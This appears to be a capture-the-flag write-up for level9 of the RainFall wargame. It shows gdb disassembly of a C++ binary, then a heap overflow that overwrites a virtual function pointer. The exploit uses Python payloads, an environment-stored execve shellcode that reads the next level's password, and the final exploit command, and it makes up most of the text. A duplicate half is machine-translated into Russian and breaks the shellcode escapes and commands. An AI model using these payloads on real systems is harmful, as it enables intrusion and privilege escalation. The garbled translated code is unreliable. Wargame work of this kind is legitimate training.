disass
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   %ebp
   0x080485f5 <+1>:	mov    %esp,%ebp
   0x080485f7 <+3>:	push   %ebx
=> 0x080485f8 <+4>:	and    $0xfffffff0,%esp
   0x080485fb <+7>:	sub    $0x20,%esp
   0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	movl   $0x1,(%esp)
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	movl   $0x6c,(%esp)
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:	mov    %eax,%ebx
   0x0804861e <+42>:	movl   $0x5,0x4(%esp)
   0x08048626 <+50>:	mov    %ebx,(%esp)
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:	movl   $0x6c,(%esp)
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:	mov    %eax,%ebx
   0x08048640 <+76>:	movl   $0x6,0x4(%esp)
   0x08048648 <+84>:	mov    %ebx,(%esp)
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:	mov    %ebx,0x18(%esp)
   0x08048654 <+96>:	mov    0x1c(%esp),%eax
   0x08048658 <+100>:	mov    %eax,0x14(%esp)
   0x0804865c <+104>:	mov    0x18(%esp),%eax
   0x08048660 <+108>:	mov    %eax,0x10(%esp)
   0x08048664 <+112>:	mov    0xc(%ebp),%eax
   0x08048667 <+115>:	add    $0x4,%eax
   0x0804866a <+118>:	mov    (%eax),%eax
   0x0804866c <+120>:	mov    %eax,0x4(%esp)
   0x08048670 <+124>:	mov    0x14(%esp),%eax
   0x08048674 <+128>:	mov    %eax,(%esp)
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax
   0x08048680 <+140>:	mov    (%eax),%eax
   0x08048682 <+142>:	mov    (%eax),%edx
   0x08048684 <+144>:	mov    0x14(%esp),%eax
   0x08048688 <+148>:	mov    %eax,0x4(%esp)
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx
   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:	leave
   0x08048699 <+165>:	ret






   level9@RainFall:~$ objdump -d -j.rodata ./level9

./level9:     file format elf32-i386


Disassembly of section .rodata:

08048838 <_fp_hw>:
 8048838:	03 00 00 00                                         ....

0804883c <_IO_stdin_used>:
 804883c:	01 00 02 00                                         ....

08048840 <_ZTV1N>:
 8048840:	00 00 00 00 54 88 04 08 3a 87 04 08 4e 87 04 08     ....T...:...N...

08048850 <_ZTS1N>:
 8048850:	31 4e 00 00                                         1N..

08048854 <_ZTI1N>:
 8048854:	88 9b 04 08 50 88 04 08                             ....P...



memcpy got 0x8049b68 -> 0x8048516
memcpy overwrite adress 0x804a010

The binary takes two arg. Then make few instructions 
and at the end call a function pointer.

With this  `python -c 'print "A"*1500'` `python -c 'print "B"*500'`
in arg we can rewrite the function pointer address. :
(gdb) info reg $eax
eax       0x41414141            1818978921


The goal is to rewrite this address with a shellcode's address.
Now we need to know exactly where write our address:

`python -c 'print "A"*100 + "abcdefghijklmnopqrstuvwxyz"'` `python -c 'print "B"*500'`

(gdb) info reg $eax
eax            0x6c6b6a69       1818978921

6c 6b 6a 69 is the ascii code for i j k l.

`python -c 'print "A"*100 + "abcdefgh"+"SHELLCODEADDRESS"+"mnopqrstuvwxyz"'` `python -c 'print "B"*500'`

First we set a variable in the environment with the shellcode

export SHELLCODE=`python -c 'print "\x90"*100 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/user/bonus0/.pass;exit;"'`

Then we have to set a variable with the address of the shellcode.

export SHELLADD=`python -c 'print "\x38\xf7\xff\xbf" * 50'`

now we need the address of SHELLADD :

x/1024x $ebp 
0xbffffe48:	0x6f682f3d	0x752f656d	0x2f726573	0x6576656c
0xbffffe58:	0x5300396c	0x4c564c48	0x4c00333d	0x414e474f
0xbffffe68:	0x6c3d454d	0x6c657665	0x48530039	0x414c4c45
0xbffffe78:	0xf83d4444	0xf8bffff7	0xf8bffff7	0xf8bffff7
0xbffffe88:	0xf8bffff7	0xf8bffff7	0xf8bffff7	0xf8bffff7
0xbffffe98:	0xf8bffff7	0xf8bffff7	0xf8bffff7	0xf8bffff7
0xbffffea8:	0xf8bffff7	0xf8bffff7	0xf8bffff7	0xf8bffff7
0xbffffeb8:	0xf8bffff7	0xf8bffff7	0xf8bffff7	0xf8bffff7
0xbffffec8:	0xf8bffff7	0xf8bffff7	0xf8bffff7	0xf8bffff7

the address is 0xbffffe88

`python -c 'print "A"*100 + "abcdefgh"+"\x89\xfe\xff\xbf"+"mnopqrstuvwxyz"'` `python -c 'print "B"*500'`


memcpy получил 0x8049b68 -> 0x8048516
memcpy перезаписать адрес 0x804a010

Бинарный файл принимает два аргумента. Затем сделайте несколько инструкций
и в конце вызвать указатель на функцию.

С помощью этого `python -c 'напечатайте" A "* 1500'`` python -c' print "B" * 500'`
в arg мы можем переписать адрес указателя функции. :
(gdb) информация reg $ eax
eax 0x41414141 1818978921


Цель состоит в том, чтобы переписать этот адрес на адрес шеллкода.
Теперь нам нужно точно знать, где пишем наш адрес:

`python -c 'print" A "* 100 +" abcdefghijklmnopqrstuvwxyz "'` `python -c 'print" B "* 500'`

(gdb) информация reg $ eax
eax 0x6c6b6a69 1818978921

6c 6b 6a 69 - это код ascii для ijk l.

`python -c 'print" A "* 100 +" abcdefgh "+" SHELLCODEADDRESS "+" mnopqrstuvwxyz "'` `python -c 'print" B "* 500'`

Сначала мы устанавливаем переменную в среде с шеллкодом

экспорт SHELLCODE = `python -c 'print" \ x90 "* 100 +" \ x6a \ x46 \ x58 \ x31 \ xdb \ x31 \ xc9 \ xcd \ x80 \ xeb \ x21 \ x5f \ x6a \ x0b \ x58 \ x99 \ x52 \ x66 \ x68 \ x2d \ x63 \ x89 \ xe6 \ x52 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x52 \ x57 \ x56 \ x53 \ x89 \ xe1 \ xcd \ x80 \ xe8 \ xda \ xff \ xff \ xffcat /home/user/bonus0/.pass;exit; "'`

Затем мы должны установить переменную с адресом шеллкода.

экспорт SHELLADD = `python -c 'print" \ x38 \ xf7 \ xff \ xbf "* 50'`

теперь нам нужен адрес SHELLADD:

x / 1024x $ ebp 
0xbffffe48: 0x6f682f3d 0x752f656d 0x2f726573 0x6576656c
0xbffffe58: 0x5300396c 0x4c564c48 0x4c00333d 0x414e474f
0xbffffe68: 0x6c3d454d 0x6c657665 0x48530039 0x414c4c45
0xbffffe78: 0xf83d4444 0xf8bffff7 0xf8bffff7 0xf8bffff7
0xbffffe88: 0xf8bffff7 0xf8bffff7 0xf8bffff7 0xf8bffff7
0xbffffe98: 0xf8bffff7 0xf8bffff7 0xf8bffff7 0xf8bffff7
0xbffffea8: 0xf8bffff7 0xf8bffff7 0xf8bffff7 0xf8bffff7
0xbffffeb8: 0xf8bffff7 0xf8bffff7 0xf8bffff7 0xf8bffff7
0xbffffec8: 0xf8bffff7 0xf8bffff7 0xf8bffff7 0xf8bffff7

адрес 0xbffffe88

`python -c 'print" A "* 100 +" abcdefgh "+" \ x89 \ xfe \ xff \ xbf "+" mnopqrstuvwxyz "'` `python -c 'print" B "* 500'`